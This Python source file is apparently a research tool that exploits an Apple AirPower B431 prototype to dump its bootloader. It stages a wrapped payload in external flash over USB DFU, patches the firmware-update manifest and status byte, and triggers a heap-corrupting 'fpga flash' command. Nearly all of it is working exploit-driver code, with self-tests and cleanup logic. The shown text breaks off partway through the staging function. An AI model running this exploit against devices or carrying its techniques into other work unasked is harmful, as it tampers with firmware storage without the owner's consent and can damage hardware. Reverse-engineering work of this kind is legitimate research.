#!/usr/bin/env python3
"""USB-only AirPower B431 Apple bootloader dump exploit.

This tool stages the accepted Apple-wrapped VME image in the B431's external
firmware-update staging area, temporarily points manifest slot 3 at it, triggers
``fpga flash``, and decodes the resulting 32 KiB hexadecimal boot-region dump.
The exploit runs entirely through the device's CDC console and DfuSe USB
interface.
"""
from __future__ import annotations

import argparse
import array
import contextlib
import datetime as dt
import fcntl
import hashlib
import io
import json
import os
import re
import select
import shlex
import subprocess
import sys
import termios
import tempfile
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Optional

ROOT = Path(__file__).resolve().parent
PAYLOAD = ROOT / "payload" / "airpower-return-pivot-boot-dump.apple-wrapped.bin"
DFU_SOURCE = ROOT / "dfu_write.c"

# The payload is immutable exploit input, while staging expands it to the three
# 4 KiB sectors consumed by the firmware-update flash path.
SECTOR_SIZE = 4096
NVS_READ_SIZE = 1024
NVS_ROW_SIZE = 16
STAGING_WINDOW_SECTORS = 8

MANIFEST_SLOT_OFFSET = 0x190
MANIFEST_STATUS_BYTE = 3
MANIFEST_ERASE_PROBE_OFFSET = 0x110

PAYLOAD_SIZE = 8416
PAYLOAD_SHA256 = "1b8f34f05d024b8124d6065f903511ad07fb3cd2a7ce3b210a9323c1df8be071"
STAGING_SECTORS = 3
STAGING_SIZE = STAGING_SECTORS * SECTOR_SIZE
BOOT_SIZE = 32768
BOOT_BYTES_PER_LINE = 32
BOOT_HEX_LINE_COUNT = BOOT_SIZE // BOOT_BYTES_PER_LINE
BOOT_SHA256 = "ef09627e43ef6cfcd6346d3801d47b2ea96632c5f2ac44285444e54be739aa42"

# The console maps external flash at 0x9xxxxxxx.  The manifest occupies the
# sector beginning 0x90000000; firmware-update slot 3 points to staging at
# external offset 0x400000 (console address 0x90400000).  In DFU mode the same
# destinations are addressed as 0x30000000 and 0x30400000, respectively.
MANIFEST_CONSOLE_BASE = 0x90000000
STAGING_CONSOLE_BASE = 0x90400000
STAGING_FLASH_OFFSET = 0x00400000
MANIFEST_DFU_BASE = 0x30000000
STAGING_DFU_BASE = 0x30400000

# Both USB interfaces share Apple VID:PID, so product and serial are identity
# gates rather than cosmetic labels.
VID = 0x05AC
PID = 0x1404
CONSOLE_PRODUCT = "B431 serial interface"
CONSOLE_SERIAL = "0123456789ABCDEFCCDDEEFF"
DFU_PRODUCT = "B431 DFU interface"
DFU_SERIAL = "FFFFFFFEFFFF"
# The EVT parser prints this exact prompt.  Commands must terminate with CR
# only; a trailing LF can become the first byte of the next command line.
PROMPT = b"B431-22-EVT> "
BAUD = 1_250_000

EXPECTED_FPGA_VERSION = {
    "Product ID": 7,
    "Major": 3,
    "Minor": 2,
    "Build": 0,
}

# Conservative command timeouts used by the normal console/flash state machine.
SHORT_COMMAND_TIMEOUT = 45.0
SECTOR_READ_TIMEOUT = 120.0
EXPLOIT_TIMEOUT = 120.0
# macOS IOSSIOSPEED request for an arbitrary speed_t value.
IOSSIOSPEED = 0x80085402
# NVS rows carry a checked address followed by exactly 16 hexadecimal bytes.
NVS_ROW = re.compile(rb"\[nvs\] \[0x([0-9a-fA-F]+)\] ((?:[0-9a-fA-F]{2} ){15}[0-9a-fA-F]{2}) ")
FPGA_FIELD = re.compile(rb"\[fpga\] ([A-Za-z ]+): ([0-9]+)")

# The payload prints 32 data bytes as 64 uppercase hexadecimal characters per
# line.  Exact begin/end framing and line count are required; padding is not.
BOOT_BEGIN = b"B431 BOOT BEGIN"
BOOT_END = b"B431 BOOT END"


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def atomic_write(path: Path, data: bytes) -> None:
    """Write a complete file or leave the previous file untouched."""
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(f".{path.name}.tmp-{os.getpid()}")
    with temporary.open("wb") as stream:
        stream.write(data)
        stream.flush()
        os.fsync(stream.fileno())
    os.replace(temporary, path)


def atomic_write_json(path: Path, value: object) -> None:
    """Persist JSON state atomically so interruption cannot truncate it."""
    atomic_write(path, (json.dumps(value, indent=2, sort_keys=True) + "\n").encode())


def strip_ansi(data: bytes) -> bytes:
    """Remove the console parser's red color escapes before framing text."""
    return data.replace(b"\x1b[31m", b"").replace(b"\x1b[0m", b"")


def decode_boot_dump(response: bytes) -> tuple[bytes, list[str]]:
    """Decode the framed dump, rejecting every nonexact framing variant."""
    begin = response.find(BOOT_BEGIN)
    end = response.find(BOOT_END, begin + len(BOOT_BEGIN) if begin >= 0 else 0)
    if begin < 0 or end < 0:
        raise ValueError("boot dump begin/end markers are absent")

    window = response[begin + len(BOOT_BEGIN):end]
    lines: list[bytes] = []
    for raw_line in window.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if PROMPT.strip() in line:
            raise ValueError("prompt interleaved inside boot dump framing")
        if not re.fullmatch(rb"[0-9A-Fa-f]{64}", line):
            raise ValueError(f"malformed boot hex line {line[:80]!r}")
        lines.append(line)

    if len(lines) != BOOT_HEX_LINE_COUNT:
        raise ValueError(
            f"expected {BOOT_HEX_LINE_COUNT} hex lines, found {len(lines)}"
        )
    recovered = b"".join(bytes.fromhex(line.decode("ascii")) for line in lines)
    if len(recovered) != BOOT_SIZE:
        raise ValueError(f"decoded {len(recovered)} bytes, expected {BOOT_SIZE}")
    return recovered, [line.decode("ascii") for line in lines]


def patch_manifest(manifest: bytes, payload_size: int = PAYLOAD_SIZE) -> bytes:
    """Patch only the slot-3 pointer, length, and DfuSe status byte."""
    if len(manifest) != SECTOR_SIZE:
        raise ValueError(f"manifest is {len(manifest)} bytes, expected {SECTOR_SIZE}")
    patched = bytearray(manifest)
    # Manifest slot 3's pointer field is at 0x190 and its length field follows
    # at 0x194.  Slot 3 selects external-flash offset 0x400000 and the exact
    # 8,416-byte Apple-wrapped VME image; unrelated manifest data stays intact.
    # Byte 3 is the B431's empirical update-status byte.  The value 0x7f is the
    # accepted state that lets fpga flash select the image without first driving
    # the normal fwup reboot walker.
    patched[MANIFEST_SLOT_OFFSET : MANIFEST_SLOT_OFFSET + 4] = STAGING_FLASH_OFFSET.to_bytes(
        4,
        "little",
    )
    patched[MANIFEST_SLOT_OFFSET + 4 : MANIFEST_SLOT_OFFSET + 8] = payload_size.to_bytes(
        4,
        "little",
    )
    patched[MANIFEST_STATUS_BYTE] = 0x7F
    return bytes(patched)


class SelfTestError(RuntimeError):
    """Raised when an offline self-test accepts malformed input."""


def run_self_tests() -> None:
    """Exercise the decoder and manifest patch without touching hardware."""
    reference = bytes((index * 37 + 11) & 0xFF for index in range(BOOT_SIZE))
    lines = [
        reference[offset : offset + 32].hex().upper()
        for offset in range(0, BOOT_SIZE, 32)
    ]
    encoded_lines = b"\r\n".join(line.encode("ascii") for line in lines)
    framed = (
        b"noise\r\n"
        + BOOT_BEGIN
        + b"\r\n"
        + encoded_lines
        + b"\r\n"
        + BOOT_END
        + b"\r\n"
    )
    recovered, decoded_lines = decode_boot_dump(framed)
    if recovered != reference or decoded_lines != lines:
        raise SelfTestError("synthetic boot decoder did not reproduce its input")

    for bad in (
        framed.replace(BOOT_END, b""),
        framed.replace(lines[0].encode(), lines[0].encode()[:63]),
        framed.replace(BOOT_BEGIN + b"\r\n", BOOT_BEGIN + b"\r\n" + PROMPT + b"\r\n"),
    ):
        try:
            decode_boot_dump(bad)
        except ValueError:
            continue
        raise SelfTestError("decoder accepted malformed input")

    manifest = b"\xff" * SECTOR_SIZE
    patched = patch_manifest(manifest)
    expected_slot = b"\x00\x00\x40\x00\xe0\x20\x00\x00"
    patched_slot = patched[MANIFEST_SLOT_OFFSET : MANIFEST_SLOT_OFFSET + 8]
    if patched_slot != expected_slot or patched[MANIFEST_STATUS_BYTE] != 0x7F:
        raise SelfTestError("manifest patch is incorrect")

    with tempfile.TemporaryDirectory(prefix="airpower-bootloader-dump-selftest-") as temporary:
        root = Path(temporary) / "run"
        with contextlib.redirect_stdout(io.StringIO()) as stdout:
            run = Run(root, resume=False)
            run.write_artifact("test-evidence.bin", b"evidence", "self-test evidence")
            atomic_write(run.bootloader_path, b"boot-region")
            run.announce_bootloader(run.bootloader_path)
            run.print_final_locations()
            run.phase("payload_staged")
            run.close()

        assert run.state_path.parent == run.artifacts
        assert run.events_path.parent == run.artifacts
        assert run.raw_path.parent == run.artifacts
        assert run.bootloader_path.parent == run.out
        assert run.artifacts.is_dir()
        assert {entry.name for entry in run.out.iterdir()} == {
            "artifacts",
            "bootloader-08000000-08007fff.bin",
        }
        assert "wrote self-test evidence" not in stdout.getvalue()
        assert str(run.artifacts / "test-evidence.bin") not in stdout.getvalue()
        assert "wrote recovered Apple B431 bootloader dump" in stdout.getvalue()
        assert str(run.bootloader_path) in stdout.getvalue()
        assert "Bootloader:" in stdout.getvalue()
        assert "artifacts:" in stdout.getvalue()
        assert str(run.artifacts.resolve()) in stdout.getvalue()

        legacy = Path(temporary) / "legacy-run"
        legacy.mkdir()
        atomic_write(legacy / "state.json", b"{}")
        atomic_write(legacy / "rx.bin", b"legacy-console")
        atomic_write(
            legacy / "bootloader-08000000-08007fff.bin",
            b"legacy-boot-region",
        )
        with contextlib.redirect_stdout(io.StringIO()):
            resumed = Run(legacy, resume=True)
            resumed.close()
        assert (legacy / "artifacts" / "state.json").is_file()
        assert (legacy / "artifacts" / "rx.bin").read_bytes() == b"legacy-console"
        assert (
            legacy / "bootloader-08000000-08007fff.bin"
        ).read_bytes() == b"legacy-boot-region"


def verify_payload() -> None:
    """Refuse hardware work unless the immutable exploit input is exact."""
    payload = PAYLOAD.read_bytes()
    if len(payload) != PAYLOAD_SIZE or sha256(payload) != PAYLOAD_SHA256:
        raise RuntimeError(
            f"payload integrity failure: size={len(payload)} "
            f"sha256={sha256(payload)}"
        )


@dataclass(frozen=True)
class UsbDevice:
    """Identity and macOS topology fields for one attached USB device."""

    vid: Optional[str]
    pid: Optional[str]
    product: Optional[str]
    serial: Optional[str]
    location: Optional[int]
    callout: Optional[str]

    def event_record(self) -> dict[str, object]:
        """Return a JSON-serializable copy for the evidence log."""
        return asdict(self)


@dataclass(frozen=True)
class UsbIdentity:
    """One of the B431's two USB personalities."""

    label: str
    product: str
    serial: str


CONSOLE_IDENTITY = UsbIdentity("console", CONSOLE_PRODUCT, CONSOLE_SERIAL)
DFU_IDENTITY = UsbIdentity("dfu", DFU_PRODUCT, DFU_SERIAL)


def ioreg_topology() -> bytes:
    """Return macOS's recursive USB host-device registry dump."""
    command = ["/usr/sbin/ioreg", "-r", "-c", "IOUSBHostDevice", "-l", "-w", "0"]
    return subprocess.run(command, check=True, capture_output=True).stdout


def _usb_device_from_block(block: str) -> UsbDevice:
    """Extract the identity and callout fields from one ioreg device block."""

    def property_value(name: str) -> Optional[str]:
        match = re.search(rf'"{name}" = "?([^"\n]+)"?', block)
        return match.group(1) if match else None

    location = re.search(r'"locationID" = (\d+)', block)
    callout = re.search(r'"IOCalloutDevice" = "(/dev/cu\.usbmodem[^"]+)"', block)
    return UsbDevice(
        vid=property_value("idVendor"),
        pid=property_value("idProduct"),
        product=property_value("USB Product Name"),
        serial=property_value("USB Serial Number"),
        location=int(location.group(1)) if location else None,
        callout=callout.group(1) if callout else None,
    )


def usb_devices(topology: bytes) -> list[UsbDevice]:
    """Collect identity, topology, and callout properties by USB device block."""
    lines = topology.decode(errors="replace").splitlines()
    devices: list[UsbDevice] = []
    for index, line in enumerate(lines):
        if "<class IOUSBHostDevice," not in line:
            continue

        depth = line.index("+-o")
        end = index + 1
        while end < len(lines):
            if "+-o" in lines[end] and lines[end].index("+-o") <= depth:
                break
            end += 1

        block = "\n".join(lines[index:end])
        devices.append(_usb_device_from_block(block))
    return devices


def matching_device(identity: UsbIdentity, timeout: float = 25.0) -> UsbDevice:
    """Wait for exactly one B431 USB identity in the requested mode."""
    deadline = time.monotonic() + timeout
    latest: list[UsbDevice] = []
    while time.monotonic() < deadline:
        latest = usb_devices(ioreg_topology())
        matches = [
            device
            for device in latest
            if device.vid == str(VID)
            and device.pid == str(PID)
            and device.product == identity.product
            and device.serial == identity.serial
        ]
        if len(matches) == 1:
            return matches[0]
        time.sleep(0.2)

    raise RuntimeError(
        f"{identity.label} device not found uniquely; latest={[asdict(d) for d in latest]!r}"
    )


def location_to_bus_ports(location: int) -> tuple[int, list[int]]:
    """Decode macOS locationID into libusb bus/port-path values."""
    bus = (location >> 24) & 0xFF
    ports = [
        nibble
        for shift in (20, 16, 12, 8, 4, 0)
        if (nibble := (location >> shift) & 0xF) != 0
    ]
    return bus, ports


class Console:
    """Exclusive raw CDC console with state restoration and evidence logging."""

    def __init__(self, run: "Run"):
        """Open and configure the unique B431 CDC callout device."""
        device = matching_device(CONSOLE_IDENTITY)
        if device.callout is None:
            raise RuntimeError(f"B431 console has no callout device: {device!r}")

        self.run = run
        self.port = device.callout
        self.fd: Optional[int] = os.open(
            self.port,
            os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK,
        )
        self.saved_attributes: Optional[list[Any]] = None

        try:
            self._configure()
            self.run.log(
                "Opened the exclusive B431 CDC console",
                port=self.port,
                product=device.product,
                serial=device.serial,
            )
            self.run.event(
                "console_opened",
                port=self.port,
                device=device.event_record(),
            )
        except Exception:
            self.close()
            raise

    def _configure(self) -> None:
        """Put the descriptor into exclusive raw mode at 1.25 Mbaud."""
        fcntl.ioctl(self.fd, termios.TIOCEXCL)
        self.saved_attributes = termios.tcgetattr(self.fd)

        attributes = termios.tcgetattr(self.fd)
        # Raw mode: no input/output processing, 8 data bits, and no flow
        # control. The parser requires CR-only command termination.
        attributes[0] = 0
        attributes[1] = 0
        attributes[2] = termios.CS8 | termios.CREAD | termios.CLOCAL
        attributes[3] = 0
        attributes[6][termios.VMIN] = 0
        attributes[6][termios.VTIME] = 0
        termios.tcsetattr(self.fd, termios.TCSANOW, attributes)

        speed = array.array("L", [BAUD])
        if speed.itemsize != 8:
            raise RuntimeError("unexpected macOS speed_t size")

        # IOSSIOSPEED owns arbitrary macOS baud rates. A second termios speed
        # assignment rejects 1,250,000 on current Python/macOS builds.
        fcntl.ioctl(self.fd, IOSSIOSPEED, speed)

        modem_mask = termios.TIOCM_DTR | termios.TIOCM_RTS
        fcntl.ioctl(
            self.fd,
            termios.TIOCMBIS,
            array.array("i", [modem_mask]),
        )

        current = termios.tcgetattr(self.fd)
        if current[:4] != attributes[:4]:
            raise RuntimeError("serial attributes did not retain requested settings")

    def _write(self, data: bytes) -> None:
        """Write all bytes or report a partial serial write."""
        if os.write(self.fd, data) != len(data):
            raise RuntimeError("partial serial write")

    def receive(
        self,
        seconds: float,
        stop_on: Optional[bytes] = None,
    ) -> bytes:
        """Read until timeout, prompt, or an explicit binary-safe stop marker."""
        buffer = bytearray()
        deadline = time.monotonic() + seconds

        while time.monotonic() < deadline:
            timeout = max(0.0, deadline - time.monotonic())
            if not select.select([self.fd], [], [], timeout)[0]:
                break

            try:
                chunk = os.read(self.fd, 65536)
            except BlockingIOError:
                continue
            if chunk == b"":
                raise EOFError("serial EOF")

            offset = self.run.raw.tell()
            self.run.raw.write(chunk)
            self.run.raw.flush()
            buffer.extend(chunk)
            self.run.event(
                "rx",
                offset=offset,
                count=len(chunk),
                prompt_seen=PROMPT in bytes(buffer)[-SECTOR_SIZE:],
            )

            # An explicit stop marker outranks a prompt. During fpga flash the
            # parser can emit a prompt before all exploit output has arrived.
            if stop_on is not None and stop_on in bytes(buffer):
                break
            if stop_on is None and PROMPT in bytes(buffer):
                break

        return bytes(buffer)

    def ensure_prompt(self, initial_seconds: float = 5.0) -> bytes:
        """Obtain a parser prompt without sending a substantive command."""
        received = self.receive(initial_seconds)
        if PROMPT in received:
            return received

        self.run.event("tx", phase="bootstrap_question", command="?")
        self._write(b"?\r")
        received += self.receive(10.0)
        if PROMPT not in received:
            raise RuntimeError("no B431 prompt after safe question-mark bootstrap")
        return received

    def _response_end(
        self,
        response: bytes,
        plain: bytes,
        echoed: bytes,
        start: int,
        stop_on: Optional[bytes],
    ) -> int:
        """Return the exclusive end offset for a complete command response."""
        if stop_on is None:
            end = plain.find(PROMPT, start + len(echoed))
            if end < 0:
                raise RuntimeError("command completed without a parser prompt")
            return end

        if stop_on not in response:
            raise RuntimeError("command completed without its requested stop marker")
        return response.find(stop_on) + len(stop_on)

    def command(
        self,
        command: str,
        timeout: float = 60.0,
        label: Optional[str] = None,
        stop_on: Optional[bytes] = None,
    ) -> bytes:
        """Send one CR-only command and return only its framed response."""
        label = label or re.sub(r"[^A-Za-z0-9_.-]+", "_", command)
        self.run.event("tx", phase=label, command=command)

        # Commands are intentionally sent once. In particular, resending a
        # silent fpga flash could execute a corrupted heap operation twice.
        encoded = command.encode("ascii") + b"\r"
        self._write(encoded)

        response = self.receive(timeout, stop_on=stop_on)
        plain = strip_ansi(response)
        echoed = command.encode("ascii") + b"\r\n"
        start = plain.find(echoed)
        if start < 0:
            self._save_response(label, response)
            raise RuntimeError(f"no echo for {command!r}; saved {label}-response.bin")

        try:
            end = self._response_end(response, plain, echoed, start, stop_on)
        except RuntimeError as error:
            self._save_response(label, response)
            raise RuntimeError(f"{error}; saved {label}-response.bin") from error

        output = plain[start:end]
        self._save_response(label, output)
        self.run.event(
            "command_complete",
            phase=label,
            command=command,
            bytes=len(output),
            sha256=sha256(output),
        )
        return output

    def _save_response(self, label: str, response: bytes) -> None:
        """Persist a raw command response beneath artifacts/console-responses/."""
        self.run.write_artifact(
            Path("console-responses") / f"{label}-response.bin",
            response,
            f"raw console response for {label}",
        )

    def send_only(self, command: str, seconds: float = 2.0) -> bytes:
        """Send a mode-changing command whose response need not complete."""
        self.run.event("tx", phase="send_only", command=command)
        self._write(command.encode("ascii") + b"\r")
        try:
            return self.receive(seconds)
        except (EOFError, OSError, termios.error):
            return b""

    def close(self) -> None:
        """Restore the prior serial attributes and release the descriptor."""
        fd = getattr(self, "fd", None)
        if fd is None:
            return

        try:
            if self.saved_attributes is not None:
                termios.tcsetattr(fd, termios.TCSADRAIN, self.saved_attributes)
            os.close(fd)
            self.run.log("Closed and restored the B431 CDC console", port=self.port)
            self.run.event("console_closed", port=self.port)
        except (OSError, termios.error):
            pass
        finally:
            self.fd = None


PHASE_DESCRIPTIONS = {
    "payload_staged": "Verified the exploit image in all three staging sectors",
    "manifest_patched": "Verified firmware-update slot 3 points at the staged exploit",
    "dump_decoded": "Decoded and compared the complete framed bootloader dump",
    "cleanup_completed": "Restored the manifest, erased staging, and verified the FPGA",
}


class Run:
    """Run root, boot-region output, and nested crash-recovery artifacts."""

    def __init__(self, path: Path, resume: bool):
        """Create or reopen a run and put all non-bootloader evidence under artifacts/."""
        self.out = path
        self.out.mkdir(parents=True, exist_ok=True)
        self.artifacts = self.out / "artifacts"
        self.artifacts.mkdir(exist_ok=True)
        self.console_response_dir = self.artifacts / "console-responses"
        self.dfu_log_dir = self.artifacts / "dfu"
        self.console_response_dir.mkdir(exist_ok=True)
        self.dfu_log_dir.mkdir(exist_ok=True)

        self.state_path = self.artifacts / "state.json"
        self.events_path = self.artifacts / "events.jsonl"
        self.raw_path = self.artifacts / "rx.bin"
        self.result_path = self.artifacts / "result.json"
        self.bootloader_path = self.out / "bootloader-08000000-08007fff.bin"
        self.started = time.monotonic()
        self._migrate_legacy_artifacts()

        action = "Resuming existing" if resume else "Created new"
        print(f"{action} AirPower run; non-bootloader evidence is under artifacts/")

        # Keep rx.bin append-only across resume; seek makes new event offsets
        # describe locations in the complete evidence file, not just this process.
        self.raw = self.raw_path.open("ab")
        self.raw.seek(0, os.SEEK_END)
        self.state = self._resume_state() if resume else self._initial_state()

    def _migrate_legacy_artifacts(self) -> None:
        """Move files from the old flat layout into artifacts/ without moving dumps."""
        for entry in self.out.iterdir():
            if entry == self.artifacts or entry.name == self.bootloader_path.name:
                continue
            if not entry.is_file():
                continue

            destination = self.artifacts / entry.name
            if destination.exists():
                stamp = dt.datetime.now().strftime("%Y%m%d-%H%M%S-%f")
                destination = self.artifacts / f"{entry.stem}-legacy-{stamp}{entry.suffix}"
            entry.replace(destination)

    @staticmethod
    def _initial_state() -> dict[str, object]:
        """Return the durable crash-recovery contract for a fresh run."""
        # These flags are persisted before the operations they describe, so a
        # killed process resumes into cleanup rather than repeating a mutable
        # hardware step.
        return {
            "created_at": dt.datetime.now(dt.timezone.utc).isoformat(),
            "phase": "created",
            "payload_sha256": PAYLOAD_SHA256,
            "manifest_patched": False,
            "manifest_modify_started": False,
            "exploit_triggered": False,
            "dump_verified": False,
            "cleanup_completed": False,
        }

    def _resume_state(self) -> dict[str, object]:
        """Load and validate state written by an interrupted invocation."""
        if not self.state_path.is_file():
            raise RuntimeError(
                f"resume directory has neither artifacts/state.json nor state.json: {self.out}"
            )

        state: dict[str, object] = json.loads(self.state_path.read_text())
        state["resumed_at"] = dt.datetime.now(dt.timezone.utc).isoformat()
        return state

    def log(self, message: str, **details: object) -> None:
        """Write a human-readable progress line to stdout and durable JSON event."""
        suffix = ""
        if details:
            formatted = ", ".join(f"{key}={value!r}" for key, value in details.items())
            suffix = f" ({formatted})"
        elapsed = time.monotonic() - self.started
        print(f"[{elapsed:8.3f}s] {message}{suffix}", flush=True)
        self.event("progress", message=message, **details)

    def announce_bootloader(self, path: Path) -> None:
        """Print the one user-facing output path: the newly written bootloader."""
        print(f"wrote recovered Apple B431 bootloader dump: {path}", flush=True)
        self.event(
            "artifact_written",
            description="recovered Apple B431 bootloader dump",
            path=str(path),
        )

    def print_final_locations(self) -> None:
        """Print the final bootloader and artifact-directory locations."""
        bootloader = self.bootloader_path.resolve()
        artifacts = self.artifacts.resolve()
        print(
            f"Bootloader: {bootloader}; artifacts: {artifacts}",
            flush=True,
        )
        self.event(
            "output_locations",
            bootloader=str(bootloader),
            artifacts=str(artifacts),
        )

    def event(self, kind: str, **values: object) -> None:
        """Append a timestamped machine-readable event to artifacts/events.jsonl."""
        record = {
            "event": kind,
            "elapsed": round(time.monotonic() - self.started, 6),
            "utc": dt.datetime.now(dt.timezone.utc).isoformat(),
            **values,
        }
        with self.events_path.open("a") as stream:
            stream.write(json.dumps(record, sort_keys=True) + "\n")

    def write_artifact(
        self,
        relative_path: Path | str,
        data: bytes,
        description: str,
    ) -> Path:
        """Atomically write a non-bootloader artifact without printing its path."""
        path = self.artifacts / relative_path
        atomic_write(path, data)
        self.event("artifact_written", description=description, path=str(path))
        return path

    def write_json_artifact(
        self,
        relative_path: Path | str,
        value: object,
        description: str,
    ) -> Path:
        """Atomically write JSON evidence without printing its path."""
        path = self.artifacts / relative_path
        atomic_write_json(path, value)
        self.event("artifact_written", description=description, path=str(path))
        return path

    def save_state(self) -> None:
        """Atomically persist the recovery checkpoint in artifacts/state.json."""
        self.state["updated_at"] = dt.datetime.now(dt.timezone.utc).isoformat()
        atomic_write_json(self.state_path, self.state)

    def phase(self, name: str) -> None:
        """Persist a phase and announce its human-readable completion message."""
        self.state["phase"] = name
        self.save_state()
        message = PHASE_DESCRIPTIONS.get(name, name)
        self.log(message, phase=name)

    def close(self) -> None:
        """Close the append-only raw-console evidence stream."""
        self.raw.close()


def compile_dfu_helper(run: Run) -> Path:
    """Compile the pinned libusb helper into the run's artifacts directory."""
    binary = run.artifacts / "dfu-write"
    try:
        flags = shlex.split(
            subprocess.check_output(
                ["pkg-config", "--cflags", "--libs", "libusb-1.0"], text=True
            ).strip()
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as error:
        raise RuntimeError("pkg-config cannot find Homebrew libusb-1.0") from error
    command = ["clang", str(DFU_SOURCE), "-o", str(binary), *flags]
    run.log("Compiling the pinned libusb DFU helper")
    run.event("compile_begin", command=command)
    subprocess.run(command, check=True, capture_output=True)
    run.event("compile_complete", sha256=sha256(binary.read_bytes()))
    return binary


def read_console_sector(console: Console, base_address: int, label: str) -> bytes:
    """Read and verify one 4 KiB console-formatted flash sector."""
    # The B431 formatter emits 16 bytes per row and this reader consumes four
    # checked 1,024-byte reads per sector.  Exact row addresses prevent gaps,
    # overlap, and reordered evidence.
    blob = bytearray()
    for offset in range(0, SECTOR_SIZE, NVS_READ_SIZE):
        address = base_address + offset
        response = console.command(
            f"nvs dump 0x{address:08x} {NVS_READ_SIZE}",
            timeout=SECTOR_READ_TIMEOUT,
            label=f"{label}_{offset:04x}",
        )
        rows = NVS_ROW.findall(response)
        expected_rows = NVS_READ_SIZE // NVS_ROW_SIZE
        if len(rows) != expected_rows:
            raise RuntimeError(f"{label}+{offset:#x}: found {len(rows)} NVS rows")

        for index, (row_address, hexadecimal) in enumerate(rows):
            expected_address = address + index * NVS_ROW_SIZE
            if int(row_address, 16) != expected_address:
                raise RuntimeError(f"{label}: NVS row address mismatch")
            blob.extend(bytes.fromhex(hexadecimal.decode("ascii")))

    if len(blob) != SECTOR_SIZE:
        raise RuntimeError(f"{label}: assembled {len(blob)} sector bytes")
    return bytes(blob)


def read_manifest(console: Console, label: str) -> bytes:
    """Read the 4 KiB manifest sector from the B431 console."""
    return read_console_sector(console, MANIFEST_CONSOLE_BASE, label)


def fpga_version(console: Console, label: str) -> dict[str, int]:
    """Verify the factory FPGA version before and after exploitation."""
    response = console.command("fpga ver", timeout=SHORT_COMMAND_TIMEOUT, label=label)
    values = {key.decode(): int(value) for key, value in FPGA_FIELD.findall(response)}
    # Product 7, version 3.2.0 identifies the factory B431 FPGA image.  Checking
    # it before and after the run detects accidental FPGA programming or an
    # incomplete return to the normal application environment.
    if values != EXPECTED_FPGA_VERSION:
        raise RuntimeError(f"unexpected FPGA version at {label}: {values!r}")
    console.run.log(
        "Verified the factory B431 FPGA image",
        phase=label,
        version="7.3.2.0",
    )
    return values


def enter_dfu(console: Console) -> tuple[int, list[int]]:
    """Ask the application to enumerate its exact DFU interface."""
    # Unlike a generic USB detach, the B431's application-level `usb dfu` command
    # performs its own clean transition to the alternate DFU personality.  The
    # same VID:PID is retained, so product/serial/topology checks remain vital.
    console.send_only("usb dfu")
    console.close()
    device = matching_device(DFU_IDENTITY, timeout=25)
    location = device.location
    if not isinstance(location, int):
        raise RuntimeError(f"DFU device has no location ID: {device!r}")
    bus, ports = location_to_bus_ports(location)
    console.run.log(
        "B431 enumerated its DFU-mode USB interface",
        bus=bus,
        ports=ports,
        product=device.product,
        serial=device.serial,
    )
    console.run.event("dfu_ready", device=device.event_record(), bus=bus, ports=ports)
    return bus, ports


def dfu_write(
    run: Run,
    helper: Path,
    address: int,
    image: Path,
    bus: int,
    ports: list[int],
    tag: str,
) -> None:
    """Invoke the compiled helper for one guarded DfuSe write transaction."""
    # Addresses supplied here are DfuSe aliases, not the 0x9xxxxxxx addresses
    # shown by the console.  The helper also verifies the physical USB path so a
    # re-enumeration cannot silently redirect a flash write to another device.
    command = [
        str(helper),
        str(run.dfu_log_dir),
        tag,
        f"{address:08x}",
        str(image),
        str(bus),
        *(str(port) for port in ports),
    ]
    run.log(
        "Starting guarded DfuSe write",
        tag=tag,
        address=f"0x{address:08x}",
    )
    run.event("dfu_write_begin", command=command)
    result = subprocess.run(command, capture_output=True, text=True)
    control_log = run.dfu_log_dir / f"control-{tag}-{address:08x}.jsonl"
    if control_log.is_file():
        run.event(
            "artifact_written",
            description="DFU control-transfer log",
            path=str(control_log),
        )
    run.event(
        "dfu_write_end",
        tag=tag,
        returncode=result.returncode,
        stdout=result.stdout,
        stderr=result.stderr,
    )
    if result.returncode:
        raise RuntimeError(f"DFU write {tag} failed: {result.stderr[:1000]}")
    run.log("Completed guarded DfuSe write", tag=tag, address=f"0x{address:08x}")


def open_console(run: Run, timeout: float = 30.0) -> Console:
    """Wait for a healthy application console after a USB re-enumeration."""
    deadline = time.monotonic() + timeout
    last_error: Optional[Exception] = None
    while time.monotonic() < deadline:
        try:
            console = Console(run)
            console.ensure_prompt(8)
            run.log(
                "B431 application console is ready",
                port=console.port,
                prompt=PROMPT.decode("ascii").strip(),
            )
            run.event("console_ready", port=console.port)
            return console
        except (RuntimeError, OSError, EOFError, termios.error) as error:
            last_error = error
            time.sleep(0.5)
    raise RuntimeError(f"B431 console did not become ready: {last_error!r}")


def open_console_after_manual_power_cycle(run: Run, reason: str) -> Console:
    """Prompt for an AirPower power cycle and reopen the console."""
    run.log("AirPower power cycle required", reason=reason)
    run.event("manual_power_cycle_required", reason=reason)
    print(
        "\nPower-cycle the AirPower now. Wait about three seconds, reconnect it, "
        "and press Enter here after it has restarted:\n",
        file=sys.stderr,
        flush=True,
    )
    try:
        input()
    except EOFError as error:
        raise RuntimeError(
            "no interactive terminal available for the required power cycle; "
            "rerun with --resume after power-cycling"
        ) from error
    return open_console(run, timeout=60)


def stage_payload(run: Run, console: Console, helper: Path) -> Console:
    """Stage the wrapped exploit in three erased external-flash sectors."""
    payload = PAYLOAD.read_bytes()
    # The DFU transaction is sector-sized, but bytes after the 8,416-byte VME
    # image must remain erased and are never treated as exploit input.  The B431
    # console and DFU views differ by 0x60000000 for these external addresses.
    staging = payload + b"\xff" * (STAGING_SIZE - len(payload))
    staging_path = run.write_artifact(
        "staging-image.bin",
        staging,
        "padded 12 KiB exploit staging image",
    )
    sectors = [
        staging[offset : offset + SECTOR_SIZE]
        for offset in range(0, STAGING_SIZE, SECTOR_SIZE)
    ]

    exact = True
    for index, expected in enumerate(sectors):
        address = STAGING_CONSOLE_BASE + index * SECTOR_SIZE
        label = f"preflight_image_sector_{index:04d}"
        run.log(
            "Checking external-flash staging sector",
            sector=index,
            console_address=f"0x{address:08x}",
        )
        actual = read_console_sector(console, address, label)
        if actual == expected:
            continue

        exact = False
        if actual != b"\xff" * SECTOR_SIZE:
            # spi_flash write_byte is effectively a sector-erase command: any
            # write to a byte in a 4 KiB sector erases that containing sector.
            # Flash offset 0x400000+n is the same sector console reads at
            # 0x90400000+n.
            erase_address = STAGING_FLASH_OFFSET + index * SECTOR_SIZE
            console.command(
